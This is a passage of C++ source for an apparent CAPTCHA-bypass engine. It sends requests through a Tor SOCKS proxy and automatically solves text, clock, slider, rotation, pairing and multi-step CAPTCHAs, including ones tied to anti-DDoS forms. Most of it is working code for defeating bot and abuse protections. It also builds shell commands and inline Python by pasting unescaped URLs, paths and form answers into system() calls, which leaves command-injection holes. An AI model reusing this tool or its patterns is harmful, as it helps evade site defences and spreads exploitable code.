    std::string postData = field + "=" + answer;
    std::string cmd = "curl -s --max-time 30 --socks5-hostname 127.0.0.1:9050 -L "
                      "-c " + dataDir_ + "/cookies.txt -b " + dataDir_ + "/cookies.txt "
                      "-d \"" + postData + "\" "
                      "\"" + postUrl + "\" 2>/dev/null";
    std::string result = execCmd(cmd);

    if (result.find("captcha") != std::string::npos ||
        result.find("CAPTCHA") != std::string::npos) {
        return "";
    }
    return result;
}

std::string SynapsedEngine::downloadCaptchaImage(const std::string& imgUrl) const {
    if (imgUrl.empty() || !isUrlSafe(imgUrl)) return "";
    std::string tmpImg = "" + dataDir_ + "/cap_" + std::to_string(nowMillis()) + ".png";
    std::string cmd = "curl -s --max-time 15 --socks5-hostname 127.0.0.1:9050 -L -o " +
                      tmpImg + " \"" + imgUrl + "\" 2>/dev/null";
    system(cmd.c_str());
    std::ifstream check(tmpImg);
    if (!check.good()) return "";
    return tmpImg;
}

std::string SynapsedEngine::classifyImage(const std::string& imgPath) const {
    std::string preprocessed = imgPath + "_proc.png";
    std::string cmd = "convert " + imgPath +
        " -resize 224x224! -colorspace Gray -normalize " +
        preprocessed + " 2>/dev/null";
    system(cmd.c_str());

    std::string result = execCmd(
        "tesseract " + preprocessed + " stdout --psm 13 2>/dev/null");
    std::remove(preprocessed.c_str());
    std::string clean = trim(result);
    if (!clean.empty()) return clean;

    std::string identify = execCmd(
        "identify -verbose " + imgPath + " 2>/dev/null | head -40");

    std::string label;
    size_t colors = 0;
    size_t pos = identify.find("Colors:");
    if (pos != std::string::npos) {
        colors = std::atoi(identify.c_str() + pos + 7);
    }

    bool hasGreen = identify.find("green") != std::string::npos ||
                    identify.find("Green") != std::string::npos;
    bool hasBrown = identify.find("brown") != std::string::npos ||
                    identify.find("saddlebrown") != std::string::npos;
    bool hasBlue = identify.find("blue") != std::string::npos ||
                   identify.find("Blue") != std::string::npos;
    bool hasRed = identify.find("red") != std::string::npos;

    if (hasGreen && !hasBlue && !hasRed) label = "plant";
    else if (hasBrown && !hasGreen) label = "animal";
    else if (hasBlue && !hasGreen && !hasRed) label = "sky";
    else if (hasRed) label = "object";
    else label = "unknown_" + std::to_string(colors);

    return label;
}

std::string SynapsedEngine::solveTextCaptchaCyrillic(const std::string& imgUrl) const {
    std::string tmpImg = downloadCaptchaImage(imgUrl);
    if (tmpImg.empty()) return "";

    std::string preprocessed = tmpImg + "_clean.png";
    system(("convert " + tmpImg +
            " -colorspace Gray -blur 0x1 -threshold 50% -morphology Open Square "
            + preprocessed + " 2>/dev/null").c_str());

    std::string ocrResult = execCmd(
        "tesseract " + preprocessed + " stdout -l rus --psm 7 "
        "-c tessedit_char_whitelist="
        "\xD0\x90\xD0\x91\xD0\x92\xD0\x93\xD0\x94\xD0\x95\xD0\x96\xD0\x97"
        "\xD0\x98\xD0\x99\xD0\x9A\xD0\x9B\xD0\x9C\xD0\x9D\xD0\x9E\xD0\x9F"
        "\xD0\xA0\xD0\xA1\xD0\xA2\xD0\xA3\xD0\xA4\xD0\xA5\xD0\xA6\xD0\xA7"
        "\xD0\xA8\xD0\xA9\xD0\xAA\xD0\xAB\xD0\xAC\xD0\xAD\xD0\xAE\xD0\xAF"
        "\xD0\xB0\xD0\xB1\xD0\xB2\xD0\xB3\xD0\xB4\xD0\xB5\xD0\xB6\xD0\xB7"
        "\xD0\xB8\xD0\xB9\xD0\xBA\xD0\xBB\xD0\xBC\xD0\xBD\xD0\xBE\xD0\xBF"
        "\xD1\x80\xD1\x81\xD1\x82\xD1\x83\xD1\x84\xD1\x85\xD1\x86\xD1\x87"
        "\xD1\x88\xD1\x89\xD1\x8A\xD1\x8B\xD1\x8C\xD1\x8D\xD1\x8E\xD1\x8F"
        "0123456789 2>/dev/null");

    std::remove(tmpImg.c_str());
    std::remove(preprocessed.c_str());
    return trim(ocrResult);
}

std::string SynapsedEngine::solveOddOneOut(const std::string& html,
    const std::string& baseUrl) const {

    std::vector<std::string> imgUrls;
    std::vector<std::string> imgIds;
    size_t searchPos = 0;

    while (imgUrls.size() < 12) {
        size_t imgTag = html.find("<img", searchPos);
        if (imgTag == std::string::npos) break;
        size_t tagEnd = html.find('>', imgTag);
        if (tagEnd == std::string::npos) break;
        std::string tag = html.substr(imgTag, tagEnd - imgTag + 1);
        searchPos = tagEnd + 1;

        size_t srcP = tag.find("src=\"");
        if (srcP == std::string::npos) continue;
        srcP += 5;
        size_t srcE = tag.find('"', srcP);
        if (srcE == std::string::npos) continue;
        std::string src = tag.substr(srcP, srcE - srcP);
        if (src.find("captcha") == std::string::npos &&
            src.find("puzzle") == std::string::npos &&
            src.find("challenge") == std::string::npos) continue;

        imgUrls.push_back(src);

        size_t idP = tag.find("data-id=\"");
        if (idP == std::string::npos) idP = tag.find("id=\"");
        if (idP != std::string::npos) {
            size_t q = tag.find('"', idP + 5);
            size_t q2 = tag.find('"', q + 1);
            if (q != std::string::npos && q2 != std::string::npos)
                imgIds.push_back(tag.substr(q + 1, q2 - q - 1));
            else
                imgIds.push_back(std::to_string(imgUrls.size() - 1));
        } else {
            imgIds.push_back(std::to_string(imgUrls.size() - 1));
        }
    }

    if (imgUrls.size() < 3) return "";

    std::vector<std::string> labels;
    for (const auto& url : imgUrls) {
        std::string path = downloadCaptchaImage(url);
        if (path.empty()) { labels.push_back("fail"); continue; }
        std::string label = classifyImage(path);
        labels.push_back(label);
        std::remove(path.c_str());
    }

    std::unordered_map<std::string, int> counts;
    for (const auto& l : labels) counts[l]++;

    std::string oddLabel;
    int minCount = 9999;
    for (const auto& kv : counts) {
        if (kv.second < minCount) { minCount = kv.second; oddLabel = kv.first; }
    }

    if (minCount >= (int)labels.size() / 2) return "";

    for (size_t i = 0; i < labels.size(); i++) {
        if (labels[i] == oddLabel) return imgIds[i];
    }
    return "";
}

std::string SynapsedEngine::solveClockCaptcha(const std::string& imgUrl) const {
    std::string tmpImg = downloadCaptchaImage(imgUrl);
    if (tmpImg.empty()) return "";

    std::string grayImg = tmpImg + "_gray.png";
    system(("convert " + tmpImg +
            " -colorspace Gray -blur 0x2 -canny 0x1+10%+30% " +
            grayImg + " 2>/dev/null").c_str());

    std::string lines = execCmd(
        "python3 -c \""
        "import sys;"
        "try:\n"
        "  import cv2, math, numpy as np;"
        "  img=cv2.imread('" + grayImg + "',0);"
        "  h,w=img.shape;"
        "  cx,cy=w//2,h//2;"
        "  edges=cv2.Canny(img,50,150);"
        "  lns=cv2.HoughLinesP(edges,1,math.pi/180,30,minLineLength=int(min(h,w)*0.15),maxLineGap=10);"
        "  if lns is None: print('ERR');sys.exit();"
        "  hands=[];"
        "  for l in lns:\n"
        "    x1,y1,x2,y2=l[0];"
        "    ln=math.sqrt((x2-x1)**2+(y2-y1)**2);"
        "    ang=math.degrees(math.atan2(cy-(y1+y2)/2,((x1+x2)/2)-cx));"
        "    ang=(90-ang)%360;"
        "    hands.append((ln,ang));"
        "  hands.sort(key=lambda x:-x[0]);"
        "  if len(hands)<2: print('ERR');sys.exit();"
        "  mAng=hands[0][1];"
        "  hAng=hands[1][1];"
        "  mins=int((mAng/360)*60)%60;"
        "  hrs=int((hAng/360)*12)%12;"
        "  print(f'{hrs:02d}:{mins:02d}');"
        "except: print('ERR');"
        "\" 2>/dev/null");

    std::remove(tmpImg.c_str());
    std::remove(grayImg.c_str());

    std::string result = trim(lines);
    if (result == "ERR" || result.empty()) return "";
    return result;
}

std::string SynapsedEngine::solveHieroglyphCaptcha(const std::string& html) const {
    std::vector<std::string> shownSymbols;
    size_t pos = 0;
    while (shownSymbols.size() < 20) {
        size_t sp = html.find("data-symbol=\"", pos);
        if (sp == std::string::npos) break;
        sp += 13;
        size_t se = html.find('"', sp);
        if (se == std::string::npos) break;
        shownSymbols.push_back(html.substr(sp, se - sp));
        pos = se + 1;
    }

    if (shownSymbols.empty()) {
        pos = 0;
        std::string gridStart = "class=\"grid";
        size_t gridPos = html.find(gridStart);
        if (gridPos == std::string::npos) gridPos = html.find("class=\"symbols");
        if (gridPos != std::string::npos) {
            size_t end = html.find("</div>", gridPos);
            if (end == std::string::npos) end = html.size();
            std::string grid = html.substr(gridPos, end - gridPos);
            size_t sp2 = 0;
            while (sp2 < grid.size()) {
                size_t gt = grid.find('>', sp2);
                if (gt == std::string::npos) break;
                size_t lt = grid.find('<', gt + 1);
                if (lt == std::string::npos) break;
                std::string sym = trim(grid.substr(gt + 1, lt - gt - 1));
                if (!sym.empty() && sym.size() <= 8) shownSymbols.push_back(sym);
                sp2 = lt;
            }
        }
    }

    if (shownSymbols.size() < 3) return "";

    std::vector<std::string> optionSymbols;
    size_t selPos = html.find("<select");
    if (selPos != std::string::npos) {
        size_t selEnd = html.find("</select>", selPos);
        std::string sel = html.substr(selPos, selEnd - selPos);
        size_t op = 0;
        while (true) {
            size_t vs = sel.find("value=\"", op);
            if (vs == std::string::npos) break;
            vs += 7;
            size_t ve = sel.find('"', vs);
            if (ve == std::string::npos) break;
            optionSymbols.push_back(sel.substr(vs, ve - vs));
            op = ve + 1;
        }
    }

    if (!optionSymbols.empty()) {
        for (const auto& opt : optionSymbols) {
            bool found = false;
            for (const auto& shown : shownSymbols) {
                if (shown == opt) { found = true; break; }
            }
            if (!found) return opt;
        }
    }

    return "";
}

std::string SynapsedEngine::solveMultiStepCaptcha(const std::string& html) const {
    std::vector<std::pair<std::string, std::string>> selects;

    size_t pos = 0;
    while (true) {
        size_t selStart = html.find("<select", pos);
        if (selStart == std::string::npos) break;
        size_t selEnd = html.find("</select>", selStart);
        if (selEnd == std::string::npos) break;
        std::string selBlock = html.substr(selStart, selEnd - selStart);
        pos = selEnd + 9;

        size_t nameP = selBlock.find("name=\"");
        std::string fieldName;
        if (nameP != std::string::npos) {
            nameP += 6;
            size_t nameE = selBlock.find('"', nameP);
            if (nameE != std::string::npos) fieldName = selBlock.substr(nameP, nameE - nameP);
        }

        size_t contextEnd = selStart;
        size_t contextStart = (selStart > 500) ? selStart - 500 : 0;
        std::string context = html.substr(contextStart, contextEnd - contextStart);

        size_t imgTag = context.rfind("<img");
        std::string imgLabel;
        if (imgTag != std::string::npos) {
            size_t altP = context.find("alt=\"", imgTag);
            if (altP != std::string::npos) {
                altP += 5;
                size_t altE = context.find('"', altP);
                if (altE != std::string::npos) imgLabel = context.substr(altP, altE - altP);
            }
            if (imgLabel.empty()) {
                size_t srcP = context.find("src=\"", imgTag);
                if (srcP != std::string::npos) {
                    srcP += 5;
                    size_t srcE = context.find('"', srcP);
                    if (srcE != std::string::npos) {
                        std::string imgPath = downloadCaptchaImage(context.substr(srcP, srcE - srcP));
                        if (!imgPath.empty()) {
                            imgLabel = classifyImage(imgPath);
                            std::remove(imgPath.c_str());
                        }
                    }
                }
            }
        }

        std::string highlightedChar;
        size_t circleP = context.rfind("class=\"highlight");
        if (circleP == std::string::npos) circleP = context.rfind("class=\"active");
        if (circleP == std::string::npos) circleP = context.rfind("class=\"circle");
        if (circleP != std::string::npos) {
            size_t gt = context.find('>', circleP);
            size_t lt = context.find('<', gt + 1);
            if (gt != std::string::npos && lt != std::string::npos)
                highlightedChar = trim(context.substr(gt + 1, lt - gt - 1));
        }

        std::vector<std::pair<std::string, std::string>> options;
        size_t op = 0;
        while (true) {
            size_t optS = selBlock.find("<option", op);
            if (optS == std::string::npos) break;
            size_t valP = selBlock.find("value=\"", optS);
            if (valP == std::string::npos) break;
            valP += 7;
            size_t valE = selBlock.find('"', valP);
            if (valE == std::string::npos) break;
            std::string val = selBlock.substr(valP, valE - valP);
            size_t gt = selBlock.find('>', valE);
            size_t lt = selBlock.find("</option>", gt);
            std::string text;
            if (gt != std::string::npos && lt != std::string::npos)
                text = trim(selBlock.substr(gt + 1, lt - gt - 1));
            options.push_back({val, text});
            op = (lt != std::string::npos) ? lt + 9 : valE + 1;
        }

        std::string chosen;
        if (!imgLabel.empty()) {
            for (const auto& opt : options) {
                std::string lower = opt.second;
                for (auto& ch : lower) ch = std::tolower(ch);
                std::string lowerLabel = imgLabel;
                for (auto& ch : lowerLabel) ch = std::tolower(ch);
                if (lower.find(lowerLabel) != std::string::npos ||
                    lowerLabel.find(lower) != std::string::npos) {
                    chosen = opt.first;
                    break;
                }
            }
        }
        if (chosen.empty() && !highlightedChar.empty()) {
            for (const auto& opt : options) {
                if (opt.second == highlightedChar || opt.first == highlightedChar) {
                    chosen = opt.first;
                    break;
                }
            }
        }
        if (chosen.empty() && !options.empty()) {
            chosen = options[0].first;
        }

        if (!fieldName.empty() && !chosen.empty()) {
            selects.push_back({fieldName, chosen});
        }
    }

    if (selects.empty()) return "";

    std::string combined;
    for (size_t i = 0; i < selects.size(); i++) {
        if (i > 0) combined += "&";
        combined += selects[i].first + "=" + selects[i].second;
    }
    return combined;
}

double SynapsedEngine::detectImageRotation(const std::string& imgPath) const {
    std::string script =
        "python3 -c \""
        "import sys;"
        "try:\n"
        "  import cv2, numpy as np, math;"
        "  img = cv2.imread('" + imgPath + "');"
        "  if img is None: print(0);sys.exit();"
        "  gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY);"
        "  edges = cv2.Canny(gray, 50, 150);"
        "  lines = cv2.HoughLines(edges, 1, np.pi/180, 50);"
        "  if lines is None: print(0);sys.exit();"
        "  angles = [];"
        "  for l in lines:\n"
        "    rho, theta = l[0];"
        "    deg = math.degrees(theta);"
        "    angles.append(deg);"
        "  if not angles: print(0);sys.exit();"
        "  mean_a = sum(angles)/len(angles);"
        "  offset = mean_a - 90.0;"
        "  print(round(-offset, 1));"
        "except: print(0);"
        "\" 2>/dev/null";
    std::string result = trim(execCmd(script));
    if (result.empty()) return 0.0;
    return std::atof(result.c_str());
}

int SynapsedEngine::detectSliderOffset(const std::string& bgPath,
    const std::string& piecePath) const {
    std::string script =
        "python3 -c \""
        "import sys;"
        "try:\n"
        "  import cv2, numpy as np;"
        "  bg = cv2.imread('" + bgPath + "', 0);"
        "  pc = cv2.imread('" + piecePath + "', 0);"
        "  if bg is None or pc is None: print(0);sys.exit();"
        "  res = cv2.matchTemplate(bg, pc, cv2.TM_CCOEFF_NORMED);"
        "  _, _, _, max_loc = cv2.minMaxLoc(res);"
        "  print(max_loc[0]);"
        "except: print(0);"
        "\" 2>/dev/null";
    std::string result = trim(execCmd(script));
    if (result.empty()) return 0;
    return std::atoi(result.c_str());
}

std::string SynapsedEngine::solveRotateCaptcha(const std::string& html) const {
    struct RadioGroup {
        std::string name;
        std::vector<std::pair<std::string, int>> options;
    };
    std::vector<RadioGroup> groups;

    size_t pos = 0;
    while (true) {
        size_t inp = html.find("type=\"radio\"", pos);
        if (inp == std::string::npos) inp = html.find("type='radio'", pos);
        if (inp == std::string::npos) break;

        size_t tagStart = html.rfind('<', inp);
        size_t tagEnd = html.find('>', inp);
        if (tagStart == std::string::npos || tagEnd == std::string::npos) { pos = inp + 12; continue; }
        std::string tag = html.substr(tagStart, tagEnd - tagStart + 1);
        pos = tagEnd + 1;

        bool inCaptchaContext = tag.find("captcha") != std::string::npos ||
            tag.find("rotate") != std::string::npos ||
            tag.find("answer") != std::string::npos ||
            tag.find("anC_") != std::string::npos;
        if (!inCaptchaContext) {
            size_t formCtx = html.rfind("<form", tagStart);
            size_t divCtx = html.rfind("ancaptcha", tagStart);
            size_t divCtx2 = html.rfind("anCaptcha", tagStart);
            size_t divCtx3 = html.rfind("decaptcha", tagStart);
            size_t divCtx4 = html.rfind("ddos_form", tagStart);
            if ((formCtx == std::string::npos || tagStart - formCtx > 5000) &&
                (divCtx == std::string::npos || tagStart - divCtx > 5000) &&
                (divCtx2 == std::string::npos || tagStart - divCtx2 > 5000) &&
                (divCtx3 == std::string::npos || tagStart - divCtx3 > 5000) &&
                (divCtx4 == std::string::npos || tagStart - divCtx4 > 5000))
                continue;
        }

        std::string name, val;
        size_t nP = tag.find("name=\"");
        if (nP == std::string::npos) nP = tag.find("name='");
        if (nP != std::string::npos) {
            char q = tag[nP + 5];
            nP += 6;
            size_t nE = tag.find(q, nP);
            if (nE != std::string::npos) name = tag.substr(nP, nE - nP);
        }
        size_t vP = tag.find("value=\"");
        if (vP == std::string::npos) vP = tag.find("value='");
        if (vP != std::string::npos) {
            char q = tag[vP + 6];
            vP += 7;
            size_t vE = tag.find(q, vP);
            if (vE != std::string::npos) val = tag.substr(vP, vE - vP);
        }
        if (name.empty() || val.empty()) continue;

        std::string radioId;
        size_t idP = tag.find("id=\"");
        if (idP == std::string::npos) idP = tag.find("id='");
        if (idP != std::string::npos) {
            char q = tag[idP + 3];
            idP += 4;
            size_t idE = tag.find(q, idP);
            if (idE != std::string::npos) radioId = tag.substr(idP, idE - idP);
        }

        int degree = -1;
        if (!radioId.empty()) {
            std::string cssSelector = "#" + radioId + ":checked";
            size_t cssP = html.find(cssSelector);
            while (cssP != std::string::npos) {
                size_t rotP = html.find("rotate(", cssP);
                if (rotP != std::string::npos && rotP < cssP + 300) {
                    rotP += 7;
                    size_t rotE = html.find("deg", rotP);
                    if (rotE == std::string::npos) rotE = html.find(")", rotP);
                    if (rotE != std::string::npos) {
                        degree = std::atoi(html.substr(rotP, rotE - rotP).c_str());
                        break;
                    }
                }
                cssP = html.find(cssSelector, cssP + 1);
            }
        }
        if (degree < 0) {
            std::string searchVal = "value=\"" + val + "\"";
            size_t cssP = html.find(searchVal);
            while (cssP != std::string::npos) {
                size_t rotP = html.find("rotate(", cssP);
                if (rotP != std::string::npos && rotP < cssP + 300) {
                    rotP += 7;
                    size_t rotE = html.find("deg", rotP);
                    if (rotE == std::string::npos) rotE = html.find(")", rotP);
                    if (rotE != std::string::npos) {
                        degree = std::atoi(html.substr(rotP, rotE - rotP).c_str());
                        break;
                    }
                }
                cssP = html.find(searchVal, cssP + 1);
            }
            if (degree < 0) degree = 0;
        }

        bool found = false;
        for (auto& g : groups) {
            if (g.name == name) { g.options.push_back({val, degree}); found = true; break; }
        }
        if (!found) groups.push_back({name, {{val, degree}}});
    }

    std::string tokenField, tokenName;
    for (const auto& tok : {"ancaptcha_token", "_token", "token", "captcha_token"}) {
        std::string search = std::string("name=\"") + tok + "\"";
        size_t tokP = html.find(search);
        if (tokP != std::string::npos) {
            size_t valP = html.find("value=\"", tokP);
            if (valP != std::string::npos && valP < tokP + 300) {
                valP += 7;
                size_t valE = html.find('"', valP);
                if (valE != std::string::npos) { tokenField = html.substr(valP, valE - valP); tokenName = tok; break; }
            }
        }
    }
    if (tokenField.empty() && html.find("anC_") != std::string::npos) {
        size_t hp = html.find("type=\"hidden\"");
        while (hp != std::string::npos) {
            size_t ts = html.rfind('<', hp);
            size_t te = html.find('>', hp);
            if (ts != std::string::npos && te != std::string::npos) {
                std::string htag = html.substr(ts, te - ts + 1);
                if (htag.find("anC_") != std::string::npos) {
                    size_t hnp = htag.find("name=\"");
                    size_t hvp = htag.find("value=\"");
                    if (hnp != std::string::npos && hvp != std::string::npos) {
                        hnp += 6; size_t hne = htag.find('"', hnp);
                        hvp += 7; size_t hve = htag.find('"', hvp);
                        if (hne != std::string::npos && hve != std::string::npos) {
                            tokenName = htag.substr(hnp, hne - hnp);
                            tokenField = htag.substr(hvp, hve - hvp);
                            break;
                        }
                    }
                }
            }
            hp = html.find("type=\"hidden\"", hp + 13);
        }
    }

    std::string result;
    for (const auto& g : groups) {
        std::string bestVal;
        int bestDist = 9999;
        for (const auto& opt : g.options) {
            int dist = ((opt.second % 360) + 360) % 360;
            if (dist > 180) dist = 360 - dist;
            if (dist < bestDist) { bestDist = dist; bestVal = opt.first; }
        }
        if (!bestVal.empty()) {
            if (!result.empty()) result += "&";
            result += g.name + "=" + bestVal;
        }
    }

    if (result.empty()) {
        std::vector<std::string> imgUrls;
        size_t ip = 0;
        while (imgUrls.size() < 5) {
            size_t imgTag = html.find("<img", ip);
            if (imgTag == std::string::npos) break;
            size_t tagEnd = html.find('>', imgTag);
            if (tagEnd == std::string::npos) break;
            std::string tag = html.substr(imgTag, tagEnd - imgTag + 1);
            ip = tagEnd + 1;
            if (tag.find("captcha") == std::string::npos &&
                tag.find("rotate") == std::string::npos &&
                tag.find("data:image") == std::string::npos) continue;
            size_t srcP = tag.find("src=\"");
            if (srcP == std::string::npos) continue;
            srcP += 5;
            size_t srcE = tag.find('"', srcP);
            if (srcE == std::string::npos) continue;
            imgUrls.push_back(tag.substr(srcP, srcE - srcP));
        }
        for (size_t i = 0; i < imgUrls.size(); i++) {
            std::string path = downloadCaptchaImage(imgUrls[i]);
            if (path.empty()) continue;
            double angle = detectImageRotation(path);
            std::remove(path.c_str());
            int correction = ((int)(-angle) % 360 + 360) % 360;
            if (!result.empty()) result += "&";
            result += "rotate_" + std::to_string(i) + "=" + std::to_string(correction);
        }
    }

    if (!tokenField.empty()) {
        std::string tn = tokenName.empty() ? "ancaptcha_token" : tokenName;
        result = (result.empty() ? "" : "&") + result;
        result = tn + "=" + tokenField + result;
    }

    std::string formAction;
    size_t formP = html.find("class=\"ddos_form\"");
    if (formP == std::string::npos) formP = html.find("captcha");
    if (formP != std::string::npos) {
        size_t actP = html.rfind("action=\"", formP);
        if (actP != std::string::npos && formP - actP < 500) {
            actP += 8;
            size_t actE = html.find('"', actP);
            if (actE != std::string::npos) formAction = html.substr(actP, actE - actP);
        }
    }

    return result;
}

std::string SynapsedEngine::solveSliderCaptcha(const std::string& html) const {
    struct RadioGroup {
        std::string name;
        std::vector<std::pair<std::string, int>> options;
    };
    std::vector<RadioGroup> groups;
    size_t pos = 0;
    while (true) {
        size_t inp = html.find("type=\"radio\"", pos);
        if (inp == std::string::npos) inp = html.find("type='radio'", pos);
        if (inp == std::string::npos) break;
        size_t tagStart = html.rfind('<', inp);
        size_t tagEnd = html.find('>', inp);
        if (tagStart == std::string::npos || tagEnd == std::string::npos) { pos = inp + 12; continue; }
        std::string tag = html.substr(tagStart, tagEnd - tagStart + 1);
        pos = tagEnd + 1;
        if (tag.find("slider") == std::string::npos &&
            tag.find("captcha") == std::string::npos &&
            tag.find("slide") == std::string::npos) continue;
        std::string name, val;
        size_t nP = tag.find("name=\""); if (nP == std::string::npos) nP = tag.find("name='");
        if (nP != std::string::npos) { char q = tag[nP+5]; nP += 6; size_t nE = tag.find(q, nP); if (nE != std::string::npos) name = tag.substr(nP, nE-nP); }
        size_t vP = tag.find("value=\""); if (vP == std::string::npos) vP = tag.find("value='");
        if (vP != std::string::npos) { char q = tag[vP+6]; vP += 7; size_t vE = tag.find(q, vP); if (vE != std::string::npos) val = tag.substr(vP, vE-vP); }
        if (name.empty() || val.empty()) continue;
        int tx = 0;
        std::string sv = "value=\"" + val + "\"";
        size_t cp = html.find(sv);
        while (cp != std::string::npos) {
            size_t tp = html.find("translateX(", cp);
            if (tp == std::string::npos) tp = html.find("translate(", cp);
            if (tp != std::string::npos && tp < cp + 300) {
                size_t np = tp + (html[tp+9] == 'X' ? 11 : 10);
                size_t ne = html.find("px", np);
                if (ne == std::string::npos) ne = html.find(")", np);
                if (ne != std::string::npos) { tx = std::atoi(html.substr(np, ne - np).c_str()); break; }
            }
            cp = html.find(sv, cp + 1);
        }
        bool found = false;
        for (auto& g : groups) { if (g.name == name) { g.options.push_back({val, tx}); found = true; break; } }
        if (!found) groups.push_back({name, {{val, tx}}});
    }

    std::string tokenField;
    for (const auto& tok : {"ancaptcha_token", "_token", "token", "captcha_token"}) {
        std::string search = std::string("name=\"") + tok + "\"";
        size_t tokP = html.find(search);
        if (tokP != std::string::npos) {
            size_t valP = html.find("value=\"", tokP);
            if (valP != std::string::npos && valP < tokP + 300) {
                valP += 7; size_t valE = html.find('"', valP);
                if (valE != std::string::npos) { tokenField = html.substr(valP, valE - valP); break; }
            }
        }
    }

    if (!groups.empty()) {
        std::string result;
        for (const auto& g : groups) {
            std::string bestVal; int bestDist = 99999;
            for (const auto& opt : g.options) {
                int dist = std::abs(opt.second);
                if (dist < bestDist) { bestDist = dist; bestVal = opt.first; }
            }
            if (!bestVal.empty()) { if (!result.empty()) result += "&"; result += g.name + "=" + bestVal; }
        }
        if (!tokenField.empty()) result = "ancaptcha_token=" + tokenField + "&" + result;
        return result;
    }

    std::string bgUrl, pieceUrl;
    pos = 0;
    while (true) {
        size_t imgTag = html.find("<img", pos);
        if (imgTag == std::string::npos) break;
        size_t tagEnd = html.find('>', imgTag);
        if (tagEnd == std::string::npos) break;
        std::string tag = html.substr(imgTag, tagEnd - imgTag + 1);
        pos = tagEnd + 1;
        size_t srcP = tag.find("src=\""); if (srcP == std::string::npos) continue;
        srcP += 5; size_t srcE = tag.find('"', srcP); if (srcE == std::string::npos) continue;
        std::string src = tag.substr(srcP, srcE - srcP);
        if (tag.find("background") != std::string::npos || tag.find("slider-bg") != std::string::npos)
            bgUrl = src;
        else if (tag.find("piece") != std::string::npos || tag.find("puzzle") != std::string::npos)
            pieceUrl = src;
        else if (bgUrl.empty()) bgUrl = src;
        else if (pieceUrl.empty()) pieceUrl = src;
    }
    if (bgUrl.empty()) return "";
    std::string bgPath = downloadCaptchaImage(bgUrl);
    std::string piecePath;
    if (!pieceUrl.empty()) piecePath = downloadCaptchaImage(pieceUrl);
    int offset = 0;
    if (!piecePath.empty() && !bgPath.empty()) {
        offset = detectSliderOffset(bgPath, piecePath);
        std::remove(piecePath.c_str());
    } else if (!bgPath.empty()) {
        std::string script = "python3 -c \""
            "import sys;"
            "try:\n"
            "  import cv2, numpy as np;"
            "  img = cv2.imread('" + bgPath + "', 0);"
            "  if img is None: print(0);sys.exit();"
            "  edges = cv2.Canny(img, 100, 200);"
            "  contours, _ = cv2.findContours(edges, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE);"
            "  if not contours: print(0);sys.exit();"
            "  best = max(contours, key=cv2.contourArea);"
            "  x, y, w, h = cv2.boundingRect(best);"
            "  print(x);"
            "except: print(0);"
            "\" 2>/dev/null";
        offset = std::atoi(trim(execCmd(script)).c_str());
    }
    if (!bgPath.empty()) std::remove(bgPath.c_str());
    std::string result = "slider_0=" + std::to_string(offset);
    if (!tokenField.empty()) result = "ancaptcha_token=" + tokenField + "&" + result;
    return result;
}

std::string SynapsedEngine::solvePairCaptcha(const std::string& html) const {
    std::vector<std::pair<std::string, std::string>> images;
    size_t pos = 0;
    while (images.size() < 20) {
        size_t imgTag = html.find("<img", pos);
        if (imgTag == std::string::npos) break;
        size_t tagEnd = html.find('>', imgTag);
        if (tagEnd == std::string::npos) break;
        std::string tag = html.substr(imgTag, tagEnd - imgTag + 1);
        pos = tagEnd + 1;

        size_t srcP = tag.find("src=\"");
        if (srcP == std::string::npos) continue;
        srcP += 5;
        size_t srcE = tag.find('"', srcP);
        if (srcE == std::string::npos) continue;
        std::string src = tag.substr(srcP, srcE - srcP);

        std::string id;
        size_t idP = tag.find("data-id=\"");
        if (idP == std::string::npos) idP = tag.find("data-value=\"");
        if (idP == std::string::npos) idP = tag.find("name=\"");
        if (idP != std::string::npos) {
            size_t q = tag.find('"', idP + 5);
            size_t q2 = tag.find('"', q + 1);
            if (q != std::string::npos && q2 != std::string::npos)
                id = tag.substr(q + 1, q2 - q - 1);
        }
        if (id.empty()) id = std::to_string(images.size());
        images.push_back({src, id});
    }

    if (images.size() < 4) return "";

    struct ImgHash { std::string id; std::string hash; };
    std::vector<ImgHash> hashes;
    for (const auto& img : images) {
        std::string path = downloadCaptchaImage(img.first);
        if (path.empty()) { hashes.push_back({img.second, "fail"}); continue; }

        std::string phash = execCmd(
            "python3 -c \""
            "import sys;"
            "try:\n"
            "  import cv2, numpy as np;"
            "  img = cv2.imread('" + path + "');"
            "  if img is None: print('fail');sys.exit();"
            "  small = cv2.resize(img, (8, 8));"
            "  gray = cv2.cvtColor(small, cv2.COLOR_BGR2GRAY);"
            "  avg = gray.mean();"
            "  bits = (gray > avg).flatten();"
            "  h = 0;"
            "  for b in bits: h = (h << 1) | int(b);"
            "  print(hex(h));"
            "except: print('fail');"
            "\" 2>/dev/null");
        std::remove(path.c_str());
        hashes.push_back({img.second, trim(phash)});
    }

    std::vector<std::pair<std::string, std::string>> pairs;
    std::vector<bool> used(hashes.size(), false);
    for (size_t i = 0; i < hashes.size(); i++) {
        if (used[i] || hashes[i].hash == "fail") continue;
        for (size_t j = i + 1; j < hashes.size(); j++) {
            if (used[j] || hashes[j].hash == "fail") continue;
            if (hashes[i].hash == hashes[j].hash) {
                pairs.push_back({hashes[i].id, hashes[j].id});
                used[i] = used[j] = true;
                break;
            }
        }
    }

    if (pairs.empty()) {
        for (size_t i = 0; i < hashes.size() && pairs.empty(); i++) {
            if (used[i] || hashes[i].hash == "fail") continue;
            uint64_t h1 = std::strtoull(hashes[i].hash.c_str(), nullptr, 16);
            int bestDist = 999;
            size_t bestJ = 0;
            for (size_t j = i + 1; j < hashes.size(); j++) {
                if (used[j] || hashes[j].hash == "fail") continue;
                uint64_t h2 = std::strtoull(hashes[j].hash.c_str(), nullptr, 16);
                uint64_t diff = h1 ^ h2;
                int dist = 0;
                while (diff) { dist += diff & 1; diff >>= 1; }
                if (dist < bestDist) { bestDist = dist; bestJ = j; }
            }
            if (bestDist < 10) {
                pairs.push_back({hashes[i].id, hashes[bestJ].id});
                used[i] = used[bestJ] = true;
            }
        }
    }

    if (pairs.empty()) return "";

    std::string tokenField;
    size_t tokP = html.find("name=\"ancaptcha_token\"");
    if (tokP == std::string::npos) tokP = html.find("name=\"token\"");
    if (tokP != std::string::npos) {
        size_t valP = html.find("value=\"", tokP);
        if (valP != std::string::npos && valP < tokP + 200) {
            valP += 7;
            size_t valE = html.find('"', valP);
            if (valE != std::string::npos) tokenField = html.substr(valP, valE - valP);
        }
    }

    std::string result;
    if (!tokenField.empty()) result = "ancaptcha_token=" + tokenField;
    for (size_t i = 0; i < pairs.size(); i++) {
        if (!result.empty()) result += "&";
